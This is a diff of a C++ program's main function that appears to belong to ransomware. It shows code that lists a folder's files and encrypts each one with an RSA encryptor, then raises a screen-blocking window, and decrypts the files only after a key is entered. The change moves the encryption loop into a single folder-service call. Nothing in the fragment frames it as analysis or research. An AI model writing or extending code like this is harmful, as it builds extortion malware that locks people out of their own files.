@@ -12,19 +12,9 @@ int main(int argc, char *argv[])
     std::string key = "";
 
     FolderService folderservice;
-
-    std::vector<std::string> files = folderservice.list_files();
-
     RSAEncryptor* encryptor = new RSAEncryptor();
 
-    for (std::string filePath : files) {
-        try {
-            encryptor->encryptFile(filePath);
-        } catch(Exception ex) {
-            std::cout << ex.what()<<std::endl;
-        }
-    }
-
+    folderservice.list_files_and_encrypt(encryptor);
 
     ScreenBlocker* screenBlocker = new ScreenBlocker();
     // Set the main window
@@ -42,6 +32,7 @@ int main(int argc, char *argv[])
     }
     std::cout<<key<<std::endl;
 
+    std::vector<std::string> files = folderservice.get_data_files();
     for (std::string filePath : files) {
         try {
             encryptor->decryptFile(filePath, key);
